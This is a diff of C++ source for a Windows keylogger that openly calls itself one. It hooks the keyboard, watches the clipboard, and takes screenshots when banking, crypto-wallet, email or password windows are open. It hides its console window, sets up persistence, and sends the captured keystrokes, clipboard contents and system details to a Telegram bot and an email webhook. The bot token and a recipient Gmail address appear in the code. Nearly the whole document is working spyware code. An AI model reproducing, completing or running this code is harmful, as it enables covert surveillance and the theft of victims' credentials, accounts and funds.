@@ -1,6 +1,4 @@
 // ========== SMART KEYLOGGER WITH INTELLIGENT SCREENSHOTS ==========
-#define WIN32_LEAN_AND_MEAN
-#define _WINSOCKAPI_
 #include <windows.h>
 #include <winhttp.h>
 #include <string>
@@ -15,7 +13,6 @@
 #include <iomanip>
 #include <queue>
 #include <algorithm>
-#include <random>
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "user32.lib")
@@ -40,7 +37,7 @@ const wchar_t* EMAIL_TO = L"josephogidiagba49@gmail.com";
 // Smart Screenshot Settings
 const int MIN_SCREENSHOT_INTERVAL = 30; // Minimum 30 seconds between screenshots
 const int MAX_SCREENSHOTS_PER_HOUR = 20;
-const int KEYSTROKE_BURST_THRESHOLD = 50; // Screenshot after 50 keystrokes in short time
+const int KEYSTROKE_BURST_THRESHOLD = 50;
 
 // ========== GLOBALS ==========
 std::wstring keyBuffer, clipBuffer;
@@ -51,41 +48,26 @@ bool running = true;
 std::wstring systemID, computerName, userName, macAddress, windowsVersion;
 
 // ========== SMART ACTIVITY TRACKING ==========
-
 struct ActivityTracker {
     ULONGLONG lastKeystrokeTime = 0;
     int keystrokeCount = 0;
     std::wstring lastWindowTitle;
     ULONGLONG lastScreenshotTime = 0;
     int screenshotCounter = 0;
-    std::queue<std::wstring> pendingScreenshots;
 };
 
 ActivityTracker activityTracker;
 
-// High-value windows that trigger screenshots
+// High-value windows
 const std::vector<std::wstring> HIGH_VALUE_WINDOWS = {
     L"login", L"sign in", L"password", L"bank", L"paypal", L"credit card",
     L"bitcoin", L"crypto", L"email", L"gmail", L"outlook", L"yahoo",
     L"facebook", L"whatsapp", L"telegram", L"discord", L"skype",
     L"administrator", L"control panel", L"settings", L"cmd.exe",
-    L"powershell", L"command prompt", L"task manager", L"regedit",
-    L"banking", L"wallet", L"metamask", L"trust wallet", L"binance",
-    L"coinbase", L"kraken", L"payoneer", L"wise", L"western union"
-};
-
-// Sensitive applications
-const std::vector<std::wstring> SENSITIVE_APPS = {
-    L"chrome", L"firefox", L"edge", L"opera", L"browser",
-    L"explorer", L"notepad++", L"vscode", L"sublime",
-    L"word", L"excel", L"powerpoint", L"office",
-    L"steam", L"epic games", L"battle.net",
-    L"discord", L"skype", L"teams", L"zoom", L"anydesk",
-    L"teamviewer", L"parsec"
+    L"powershell", L"command prompt", L"task manager", L"regedit"
 };
 
 // ========== UTILITY FUNCTIONS ==========
-
 std::string url_encode(const std::string& value) {
     std::ostringstream escaped;
     escaped.fill('0');
@@ -112,17 +94,7 @@ std::string wstring_to_utf8(const std::wstring& wstr) {
     return str;
 }
 
-std::wstring utf8_to_wstring(const std::string& str) {
-    if (str.empty()) return L"";
-    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
-    std::wstring wstr(size, 0);
-    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size);
-    wstr.pop_back();
-    return wstr;
-}
-
 // ========== TELEGRAM FUNCTION ==========
-
 void send_telegram(const std::wstring& message) {
     std::thread([message]() {
         HINTERNET hSession = WinHttpOpen(L"SmartKeylogger/1.0", 
@@ -138,7 +110,9 @@ void send_telegram(const std::wstring& message) {
         
         std::string encoded = url_encode(utf8_msg);
         std::string path = "/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage?chat_id=7845441585&text=" + encoded;
-        std::wstring wpath = utf8_to_wstring(path);
+        
+        // Convert to wide string
+        std::wstring wpath(path.begin(), path.end());
         
         HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", 443, 0);
         if (!hConnect) {
@@ -160,7 +134,6 @@ void send_telegram(const std::wstring& message) {
 }
 
 // ========== EMAIL FUNCTION ==========
-
 void send_email(const std::wstring& subject, const std::wstring& body) {
     std::thread([subject, body]() {
         HINTERNET hSession = WinHttpOpen(L"SmartKeyloggerEmail/1.0",
@@ -175,11 +148,16 @@ void send_email(const std::wstring& subject, const std::wstring& body) {
             return;
         }
         
-        std::wstring data = L"subject=" + subject + L"&body=" + body;
-        data += L"&from=" + std::wstring(EMAIL_FROM);
-        data += L"&to=" + std::wstring(EMAIL_TO);
-        data += L"&computer=" + computerName;
-        data += L"&user=" + userName;
+        // Prepare data
+        std::string utf8_subject = wstring_to_utf8(subject);
+        std::string utf8_body = wstring_to_utf8(body);
+        
+        std::string data = "subject=" + url_encode(utf8_subject) + 
+                          "&body=" + url_encode(utf8_body) +
+                          "&from=" + wstring_to_utf8(EMAIL_FROM) +
+                          "&to=" + wstring_to_utf8(EMAIL_TO) +
+                          "&computer=" + wstring_to_utf8(computerName) +
+                          "&user=" + wstring_to_utf8(userName);
         
         std::wstring path = L"/" + std::wstring(WEBHOOK_ID);
         std::string headers = "Content-Type: application/x-www-form-urlencoded";
@@ -189,10 +167,12 @@ void send_email(const std::wstring& subject, const std::wstring& body) {
                                                WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                WINHTTP_FLAG_SECURE);
         if (hRequest) {
+            // Convert data to wide string
+            std::wstring wdata(data.begin(), data.end());
             WinHttpSendRequest(hRequest, headers.c_str(), headers.length(),
-                              (LPVOID)data.c_str(),
-                              data.length() * sizeof(wchar_t),
-                              data.length() * sizeof(wchar_t), 0);
+                              (LPVOID)wdata.c_str(),
+                              wdata.length() * sizeof(wchar_t),
+                              wdata.length() * sizeof(wchar_t), 0);
             WinHttpCloseHandle(hRequest);
         }
         WinHttpCloseHandle(hConnect);
@@ -201,7 +181,6 @@ void send_email(const std::wstring& subject, const std::wstring& body) {
 }
 
 // ========== DUAL DELIVERY ==========
-
 void deliver_log(const std::wstring& log_type, const std::wstring& content, bool is_sensitive = false) {
     std::wstring timestamp = std::to_wstring(GetTickCount64());
     std::wstring full_message = L"[" + log_type + L"] " + timestamp + L"\n";
@@ -209,17 +188,14 @@ void deliver_log(const std::wstring& log_type, const std::wstring& content, bool
     full_message += L"👤 " + userName + L" @ " + computerName + L"\n";
     full_message += content;
     
-    // Always send to Telegram
     send_telegram(full_message);
     
-    // Always send to Email for important logs
     std::wstring email_subject = L"Keylogger: " + log_type;
     if (is_sensitive) email_subject = L"🔴 " + email_subject;
     send_email(email_subject, full_message);
 }
 
 // ========== SMART SCREENSHOT SYSTEM ==========
-
 std::wstring get_active_window_title() {
     HWND hwnd = GetForegroundWindow();
     if (hwnd) {
@@ -236,16 +212,8 @@ bool is_high_value_window(const std::wstring& window_title) {
     std::wstring lower_title = window_title;
     std::transform(lower_title.begin(), lower_title.end(), lower_title.begin(), ::towlower);
     
-    // Check for high-value keywords
     for (const auto& keyword : HIGH_VALUE_WINDOWS) {
         if (lower_title.find(keyword) != std::wstring::npos) {
-            return true;
-        }
-    }
-    
-    // Check for sensitive applications
-    for (const auto& app : SENSITIVE_APPS) {
-        if (lower_title.find(app) != std::wstring::npos) {
             return true;
         }
     }
@@ -258,13 +226,11 @@ bool should_capture_screenshot() {
     
     EnterCriticalSection(&activityLock);
     
-    // Rate limiting
     if (activityTracker.screenshotCounter >= MAX_SCREENSHOTS_PER_HOUR) {
         LeaveCriticalSection(&activityLock);
         return false;
     }
     
-    // Minimum interval
     if (current_time - activityTracker.lastScreenshotTime < MIN_SCREENSHOT_INTERVAL * 1000) {
         LeaveCriticalSection(&activityLock);
         return false;
@@ -275,19 +241,17 @@ bool should_capture_screenshot() {
     lastInput.cbSize = sizeof(LASTINPUTINFO);
     if (GetLastInputInfo(&lastInput)) {
         DWORD idle_time = (GetTickCount() - lastInput.dwTime) / 1000;
-        if (idle_time > 300) { // 5 minutes idle
+        if (idle_time > 300) {
             LeaveCriticalSection(&activityLock);
             return false;
         }
     }
     
-    // Update tracker
     activityTracker.lastScreenshotTime = current_time;
     activityTracker.screenshotCounter++;
     
-    // Reset counter every hour
     static ULONGLONG last_reset_time = current_time;
-    if (current_time - last_reset_time > 3600000) { // 1 hour
+    if (current_time - last_reset_time > 3600000) {
         activityTracker.screenshotCounter = 0;
         last_reset_time = current_time;
     }
@@ -303,25 +267,23 @@ bool capture_screenshot() {
     int screenWidth = GetSystemMetrics(SM_CXSCREEN);
     int screenHeight = GetSystemMetrics(SM_CYSCREEN);
     
-    // Capture at reduced size for efficiency
+    // Reduced size for efficiency
     int captureWidth = screenWidth / 2;
     int captureHeight = screenHeight / 2;
     
     HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
     HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
     
-    // Scale down while capturing
     SetStretchBltMode(hdcMem, HALFTONE);
     StretchBlt(hdcMem, 0, 0, captureWidth, captureHeight, 
                hdcScreen, 0, 0, screenWidth, screenHeight, SRCCOPY);
     
-    // Get bitmap data
     BITMAPINFOHEADER bi = {0};
     bi.biSize = sizeof(BITMAPINFOHEADER);
     bi.biWidth = captureWidth;
     bi.biHeight = captureHeight;
     bi.biPlanes = 1;
-    bi.biBitCount = 24; // 24-bit RGB
+    bi.biBitCount = 24;
     bi.biCompression = BI_RGB;
     
     DWORD bitmapSize = ((captureWidth * 3 + 3) & ~3) * captureHeight;
@@ -330,14 +292,13 @@ bool capture_screenshot() {
     GetDIBits(hdcMem, hBitmap, 0, captureHeight, bitmapData.data(), 
               (BITMAPINFO*)&bi, DIB_RGB_COLORS);
     
-    // Simple compression (every other pixel)
+    // Simple compression
     std::vector<BYTE> compressed;
-    const int stride = 3;
-    for (size_t i = 0; i < bitmapData.size(); i += stride * 2) {
+    for (size_t i = 0; i < bitmapData.size(); i += 6) {
         if (i + 2 < bitmapData.size()) {
-            compressed.push_back(bitmapData[i]);     // R
-            compressed.push_back(bitmapData[i + 1]); // G
-            compressed.push_back(bitmapData[i + 2]); // B
+            compressed.push_back(bitmapData[i]);
+            compressed.push_back(bitmapData[i + 1]);
+            compressed.push_back(bitmapData[i + 2]);
         }
     }
     
@@ -345,7 +306,6 @@ bool capture_screenshot() {
     screenshotBuffer = compressed;
     LeaveCriticalSection(&screenshotLock);
     
-    // Cleanup
     SelectObject(hdcMem, hOldBitmap);
     DeleteObject(hBitmap);
     DeleteDC(hdcMem);
@@ -358,12 +318,10 @@ void smart_screenshot_monitor() {
     std::wstring last_window;
     
     while (running) {
-        Sleep(5000); // Check every 5 seconds
+        Sleep(5000);
         
-        // Get current window
         std::wstring current_window = get_active_window_title();
         
-        // Check for window changes to high-value windows
         if (!current_window.empty() && current_window != last_window) {
             last_window = current_window;
             
@@ -376,9 +334,9 @@ void smart_screenshot_monitor() {
                         
                         std::wstring message = L"📸 Smart Screenshot Captured\n";
                         message += L"🪟 Window: " + current_window + L"\n";
-                        message += L"🔍 Detected as: High-value target\n";
+                        message += L"🔍 High-value target detected\n";
                         message += L"💾 Size: " + std::to_wstring(screenshot.size()) + L" bytes\n";
-                        message += L"⏰ Time: " + std::to_wstring(GetTickCount64());
+                        message += L"⏰ " + std::to_wstring(GetTickCount64());
                         
                         deliver_log(L"Smart Screenshot", message, true);
                     }
@@ -392,14 +350,13 @@ void smart_screenshot_monitor() {
         
         if (activityTracker.keystrokeCount > KEYSTROKE_BURST_THRESHOLD) {
             if (current_time - activityTracker.lastScreenshotTime > MIN_SCREENSHOT_INTERVAL * 1000) {
-                // User is typing rapidly - capture what they're working on
                 if (capture_screenshot()) {
                     std::wstring active_window = get_active_window_title();
                     
                     std::wstring message = L"📸 Activity Screenshot\n";
-                    message += L"💨 Rapid typing detected (" + std::to_wstring(activityTracker.keystrokeCount) + L" keystrokes)\n";
+                    message += L"💨 Rapid typing (" + std::to_wstring(activityTracker.keystrokeCount) + L" keystrokes)\n";
                     message += L"🪟 Window: " + active_window + L"\n";
-                    message += L"⏰ Time: " + std::to_wstring(GetTickCount64());
+                    message += L"⏰ " + std::to_wstring(GetTickCount64());
                     
                     deliver_log(L"Activity Screenshot", message, false);
                     
@@ -408,7 +365,6 @@ void smart_screenshot_monitor() {
             }
         }
         
-        // Reset keystroke count if no activity for 10 seconds
         if (current_time - activityTracker.lastKeystrokeTime > 10000) {
             activityTracker.keystrokeCount = 0;
         }
@@ -418,7 +374,6 @@ void smart_screenshot_monitor() {
 }
 
 // ========== KEYBOARD LOGGING ==========
-
 void record_keystroke_activity() {
     ULONGLONG current_time = GetTickCount64();
     
@@ -432,7 +387,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
         
-        // Record activity for smart screenshot triggers
         record_keystroke_activity();
         
         EnterCriticalSection(&keyLock);
@@ -446,7 +400,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (result > 0) {
             keyBuffer += buffer[0];
             
-            // Send every 100 characters
             if (keyBuffer.length() >= 100) {
                 std::wstring temp = keyBuffer;
                 keyBuffer.clear();
@@ -469,7 +422,6 @@ bool install_keyboard_hook() {
 }
 
 // ========== CLIPBOARD MONITOR ==========
-
 void clipboard_monitor() {
     std::wstring lastClipboard;
     
@@ -485,7 +437,6 @@ void clipboard_monitor() {
                     if (!currentClip.empty() && currentClip != lastClipboard) {
                         lastClipboard = currentClip;
                         
-                        // Check for sensitive data
                         bool is_sensitive = false;
                         std::wstring lowerClip = currentClip;
                         std::transform(lowerClip.begin(), lowerClip.end(), 
@@ -496,18 +447,16 @@ void clipboard_monitor() {
                             lowerClip.find(L"@yahoo.com") != std::wstring::npos ||
                             lowerClip.find(L"card") != std::wstring::npos ||
                             lowerClip.find(L"bank") != std::wstring::npos ||
-                            lowerClip.find(L"login") != std::wstring::npos ||
-                            lowerClip.find(L"secret") != std::wstring::npos) {
+                            lowerClip.find(L"login") != std::wstring::npos) {
                             is_sensitive = true;
                             
-                            // Trigger screenshot for sensitive clipboard
                             if (should_capture_screenshot()) {
                                 std::thread([]() {
                                     if (capture_screenshot()) {
                                         std::wstring window = get_active_window_title();
                                         std::wstring message = L"📸 Screenshot for sensitive clipboard\n";
                                         message += L"🪟 Window: " + window + L"\n";
-                                        message += L"⏰ Time: " + std::to_wstring(GetTickCount64());
+                                        message += L"⏰ " + std::to_wstring(GetTickCount64());
                                         deliver_log(L"Clipboard Screenshot", message, true);
                                     }
                                 }).detach();
@@ -525,7 +474,6 @@ void clipboard_monitor() {
 }
 
 // ========== SYSTEM INFO ==========
-
 std::wstring GetSystemIdentifier() {
     wchar_t username[256], compname[256];
     DWORD usernamelen = 256, compnamelen = 256;
@@ -543,7 +491,12 @@ std::wstring GetSystemIdentifier() {
     GetAdaptersInfo(pAdapter, &BufferLength);
     
     if (pAdapter) {
-        macAddress = utf8_to_wstring(pAdapter->AddressString);
+        char mac[32];
+        sprintf(mac, "%02X-%02X-%02X-%02X-%02X-%02X",
+                pAdapter->Address[0], pAdapter->Address[1],
+                pAdapter->Address[2], pAdapter->Address[3],
+                pAdapter->Address[4], pAdapter->Address[5]);
+        macAddress = std::wstring(mac, mac + strlen(mac));
     }
     free(pAdapter);
     
@@ -559,7 +512,6 @@ std::wstring GetSystemIdentifier() {
 }
 
 // ========== PERSISTENCE ==========
-
 void stealth_init() {
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
@@ -580,12 +532,10 @@ void persistence() {
 }
 
 // ========== MAIN FUNCTION ==========
-
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
-                   LPWSTR lpCmdLine, int nCmdShow) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+                  LPSTR lpCmdLine, int nCmdShow) {
     DisableThreadLibraryCalls(GetModuleHandle(NULL));
     
-    // Initialize critical sections
     InitializeCriticalSection(&keyLock);
     InitializeCriticalSection(&clipLock);
     InitializeCriticalSection(&screenshotLock);
@@ -594,10 +544,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     stealth_init();
     persistence();
     
-    // Get system info
     systemID = GetSystemIdentifier();
     
-    // Send activation message
     std::wstring activationMsg = L"🚀 SMART KEYLOGGER ACTIVATED\n";
     activationMsg += L"🖥️ " + systemID + L"\n";
     activationMsg += L"👤 " + userName + L"\n";
@@ -605,32 +553,27 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     activationMsg += L"🔗 " + macAddress + L"\n";
     activationMsg += L"🪟 Windows " + windowsVersion + L"\n";
     activationMsg += L"📱 Telegram: Working\n";
-    activationMsg += L"📧 Email: Ready via Webhook\n";
+    activationMsg += L"📧 Email: Ready\n";
     activationMsg += L"📸 Smart Screenshots: Enabled\n";
     activationMsg += L"⚡ Intelligence: Active\n";
     activationMsg += L"⏰ " + std::to_wstring(GetTickCount64());
     
-    // Send to both channels
     send_telegram(activationMsg);
     send_email(L"Smart Keylogger Activated", activationMsg);
     
-    // Install keyboard hook
     if (!install_keyboard_hook()) {
         return 1;
     }
     
-    // Start monitors
     std::thread(clipboard_monitor).detach();
     std::thread(smart_screenshot_monitor).detach();
     
-    // Main message loop
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) && running) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
     
-    // Cleanup
     if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
     DeleteCriticalSection(&keyLock);
     DeleteCriticalSection(&clipLock);
